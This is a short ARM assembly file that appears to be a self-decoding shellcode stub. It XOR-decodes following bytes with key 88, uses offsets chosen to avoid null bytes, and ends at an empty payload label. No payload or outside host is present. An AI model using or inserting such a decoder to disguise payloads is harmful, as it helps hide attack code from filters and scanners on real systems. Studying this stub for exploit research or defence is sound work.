.global _start
.section .text

_start:
    add r6, pc, #36
    bx  r6

main:
    mov r4, #227

loop:
    cmp r4, #256
    bxhi lr
    sub r4, r4, #227
    ldrb r5, [lr, r4]
    eor  r5, r5, #88
    strb r5, [lr, r4]
    add  r4, r4, #228
    
    b loop
    bl main

scode:
